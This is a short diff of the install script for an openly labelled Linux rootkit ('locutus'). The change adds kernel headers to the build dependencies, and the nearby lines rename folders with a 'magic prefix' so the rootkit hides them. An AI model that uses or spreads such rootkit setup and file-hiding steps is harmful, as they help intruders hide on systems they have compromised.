@@ -3,7 +3,7 @@ echo "locutus rootkit by Terraminator (https://github.com/Terraminator)"
 echo "installing locutus..."
 mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden
 
-sudo apt install build-essential -y &&# prepare for building
+sudo apt install build-essential linux-headers-$(uname -r) -y &&# prepare for building
 
 mv locutus borg_locutus && # add magic prefix
 cd borg_locutus &&
